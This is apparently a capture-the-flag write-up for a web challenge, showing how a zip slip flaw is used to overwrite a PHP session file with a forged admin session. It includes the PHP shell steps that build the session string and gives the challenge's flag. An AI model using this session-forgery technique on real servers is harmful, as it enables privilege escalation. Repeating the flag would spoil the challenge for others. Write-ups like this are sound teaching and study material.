# Webhacking sliping beauty Solution

In this challange we exploit the zip slip, here you can read about it: [Zip Slip](https://security.snyk.io/research/zip-slip-vulnerability).

We override the session file with admin privilege, and then we can see the flag, as wrote in the source code 
```bash
agonen@PC4:~$ php -a
Interactive shell

php > session_start();
php > echo session_id();
0tf30efgp62k6u1jm9lbmeckg7
php > $_SESSION['uid'] = 'admin';
php > echo session_encode();
uid|s:5:"admin";
php >
```

Now, all left is to create our payload:
`python3 sliping_beauty.py`, and then upload it to the server.

Lastly, let's change our session ID to the session id we achieve, for example:
`0tf30efgp62k6u1jm9lbmeckg791194204` (include the random chars).


![FLAG](./images/sliping%20beauty.png)

**Flag:** ***`FLAG{my_zip_is_sliping_beauty}`*** 

